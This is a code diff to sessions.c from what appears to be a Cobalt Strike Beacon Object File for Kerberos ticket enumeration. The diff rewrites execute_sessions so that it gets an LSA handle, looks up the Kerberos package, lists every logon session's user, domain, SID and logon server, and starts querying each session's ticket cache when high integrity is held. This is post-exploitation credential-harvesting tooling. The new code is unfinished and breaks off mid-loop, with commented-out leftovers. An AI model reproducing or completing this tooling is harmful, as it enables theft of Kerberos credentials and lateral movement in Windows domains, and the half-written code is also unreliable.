@@ -1,33 +1,5 @@
 #include "sessions.h"
 
-void execute_sessions(HANDLE hToken, LUID luid, BOOL currentLuid) {
-    BOOL highIntegrity = IsHighIntegrity(hToken);
-    if (!highIntegrity && !currentLuid) {
-        PRINT(dispatch, "[!] Not in high integrity.\n");
-        return;
-    }
-
-    LOGON_SESSION_DATA sessionData;
-    PSECURITY_LOGON_SESSION_DATA data;
-    NTSTATUS status = GetLogonSessionData(luid, &sessionData);
-
-    if (NT_SUCCESS(status)) {
-        for (int i = 0; i < sessionData.sessionCount; i++) {
-            data = sessionData.sessionData[i];
-            if (data != NULL) {
-                PrintLogonSessionData(*data);
-                if (i != sessionData.sessionCount - 1) {
-                    PRINT(dispatch, "\n\n");
-                }
-                SECUR32$LsaFreeReturnBuffer(data);
-            }
-        }
-        MSVCRT$free(sessionData.sessionData);
-    } else {
-        PRINT(dispatch, "[!] execute_sessions GetLogonSessionData: %ld", status);
-    }
-}
-
 NTSTATUS GetLogonSessionData(LUID luid, LOGON_SESSION_DATA* data) {
     LOGON_SESSION_DATA sessionData;
     PSECURITY_LOGON_SESSION_DATA logonData = NULL;
@@ -75,6 +47,106 @@ NTSTATUS GetLogonSessionData(LUID luid, LOGON_SESSION_DATA* data) {
     return status;
 }
 
+
+void execute_sessions(HANDLE hToken, LUID luid, BOOL currentLuid) {
+    // IsHighIntregrity breaks it
+    BOOL highIntegrity = IsHighIntegrity(hToken);
+//    BOOL highIntegrity = TRUE;
+    if (!highIntegrity && !currentLuid) {
+        PRINT(dispatch, "[!] Not in high integrity.\n");
+        return;
+    }
+    HANDLE hLsa;
+    NTSTATUS status = GetLsaHandle(hToken, highIntegrity, &hLsa);
+    if (!NT_SUCCESS(status)) {
+        PRINT(dispatch, "[!] GetLsaHandle %ld\n", status);
+        return;
+    }
+    ULONG authPackage;
+    LSA_STRING krbAuth = {.Buffer = "kerberos", .Length = 8, .MaximumLength = 9};
+    status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage);
+    if (!NT_SUCCESS(status)) {
+        PRINT(dispatch, "[!] LsaLookupAuthenticationPackage %ld\n", ADVAPI32$LsaNtStatusToWinError(status));
+        SECUR32$LsaDeregisterLogonProcess(hLsa);
+        return;
+    }
+
+    LOGON_SESSION_DATA sessionData;
+    status = GetLogonSessionData(luid, &sessionData);
+
+    if (!NT_SUCCESS(status)) {
+        PRINT(dispatch, "[!] GetLogonSessionData: %ld", status);
+        SECUR32$LsaDeregisterLogonProcess(hLsa);
+        return;
+    }
+    KERB_QUERY_TKT_CACHE_REQUEST cacheRequest;
+    cacheRequest.MessageType = KerbQueryTicketCacheExMessage;
+//{ something from here...
+    for (int i = 0; i < sessionData.sessionCount; i++) {
+//        if (sessionData.sessionData[i] == NULL) {
+//            continue;
+//        }
+//        PrintLogonSessionData(dispatch, (*sessionData.sessionData[i]));
+         WCHAR* sid = NULL;
+         ADVAPI32$ConvertSidToStringSidW(sessionData.sessionData[i]->Sid, &sid);
+         SYSTEMTIME logon_utc = ConvertToSystemtime(sessionData.sessionData[i]->LogonTime);
+
+         BeaconPrintf(CALLBACK_OUTPUT,
+	     "\nUsername             : %s\n"
+	     "Domain               : %s\n"
+	     "LogonId              : %lx:0x%lx\n"
+	     "UserSID              : %s\n"
+	     "AuthPackage          : %s\n"
+	     "LogonTime            : %d/%d/%d %d:%d:%d\n"
+	     "LogonServer          : %s\n"
+	     "LogonServerDNSDomain : %s\n"
+         "UserPrincipalName    : %s\n",
+	     GetNarrowStringFromUnicode(sessionData.sessionData[i]->UserName),
+	     GetNarrowStringFromUnicode(sessionData.sessionData[i]->LogonDomain),
+	     sessionData.sessionData[i]->LogonId.HighPart, sessionData.sessionData[i]->LogonId.LowPart,
+	     GetNarrowString(sid),
+	     GetNarrowStringFromUnicode(sessionData.sessionData[i]->AuthenticationPackage),
+	     logon_utc.wMonth, logon_utc.wDay, logon_utc.wYear, logon_utc.wHour, logon_utc.wMinute, logon_utc.wSecond,
+	     GetNarrowStringFromUnicode(sessionData.sessionData[i]->LogonServer),
+	     GetNarrowStringFromUnicode(sessionData.sessionData[i]->DnsDomainName),
+	     GetNarrowStringFromUnicode(sessionData.sessionData[i]->Upn)
+	     );
+
+        if (highIntegrity) {
+            cacheRequest.LogonId = sessionData.sessionData[i]->LogonId;
+        } else {
+            cacheRequest.LogonId = (LUID){.HighPart = 0, .LowPart = 0};
+        }
+
+        SECUR32$LsaFreeReturnBuffer(sessionData.sessionData[i]);
+        KERB_QUERY_TKT_CACHE_EX_RESPONSE* cacheResponse = NULL;
+//    BOOL highIntegrity = IsHighIntegrity(hToken);
+//    if (!highIntegrity && !currentLuid) {
+//        PRINT(dispatch, "[!] Not in high integrity.\n");
+//        return;
+//    }
+//
+//    LOGON_SESSION_DATA sessionData;
+//    PSECURITY_LOGON_SESSION_DATA data;
+//    NTSTATUS status = GetLogonSessionData(luid, &sessionData);
+//
+//    if (NT_SUCCESS(status)) {
+//        for (int i = 0; i < sessionData.sessionCount; i++) {
+//            data = sessionData.sessionData[i];
+//            if (data != NULL) {
+//                PrintLogonSessionData(*data);
+//                if (i != sessionData.sessionCount - 1) {
+//                    PRINT(dispatch, "\n\n");
+//                }
+//                SECUR32$LsaFreeReturnBuffer(data);
+//            }
+//        }
+//        MSVCRT$free(sessionData.sessionData);
+//    } else {
+//        PRINT(dispatch, "[!] execute_sessions GetLogonSessionData: %ld", status);
+//    }
+}
+
 //char* GetLogonTypeString(ULONG uLogonType) {
 //    char* logonType = NULL;
 //    switch (uLogonType) {
@@ -107,13 +179,13 @@ NTSTATUS GetLogonSessionData(LUID luid, LOGON_SESSION_DATA* data) {
 //}
 //
 
-void PrintLogonSessionData(SECURITY_LOGON_SESSION_DATA data) {
-    BeaconPrintf(CALLBACK_OUTPUT, "sessions.c:PrintLogonSessionData");
-    WCHAR* sid = NULL;
+//void PrintLogonSessionData(SECURITY_LOGON_SESSION_DATA data) {
+//    BeaconPrintf(CALLBACK_OUTPUT, "sessions.c:PrintLogonSessionData");
+//    WCHAR* sid = NULL;
 //    ADVAPI32$ConvertSidToStringSidW(sessionData.sessionData[i]->Sid, &sid);
 //    SYSTEMTIME logon_utc = ConvertToSystemtime(sessionData.sessionData[i]->LogonTime);
-   BeaconPrintf(CALLBACK_OUTPUT,
-       "\nUsername             : %s\n",
+//   BeaconPrintf(CALLBACK_OUTPUT,
+//       "\nUsername             : %s\n",
 //       "Domain               : %s\n"
 //       "LogonId              : %lx:0x%lx\n"
 //       "UserSID              : %s\n"
@@ -122,7 +194,7 @@ void PrintLogonSessionData(SECURITY_LOGON_SESSION_DATA data) {
 //       "LogonServer          : %s\n"
 //       "LogonServerDNSDomain : %s\n"
 //       "UserPrincipalName    : %s\n",
-       GetNarrowStringFromUnicode(data.UserName)
+//       GetNarrowStringFromUnicode(data.UserName)
 //       GetNarrowStringFromUnicode(sessionData.sessionData[i]->LogonDomain),
 //       sessionData.sessionData[i]->LogonId.HighPart, sessionData.sessionData[i]->LogonId.LowPart,
 //       GetNarrowString(sid),
@@ -131,7 +203,7 @@ void PrintLogonSessionData(SECURITY_LOGON_SESSION_DATA data) {
 //       GetNarrowStringFromUnicode(sessionData.sessionData[i]->LogonServer),
 //       GetNarrowStringFromUnicode(sessionData.sessionData[i]->DnsDomainName),
 //       GetNarrowStringFromUnicode(sessionData.sessionData[i]->Upn)
-        );
+//        );
 
 //    WCHAR* sid = NULL;
 //
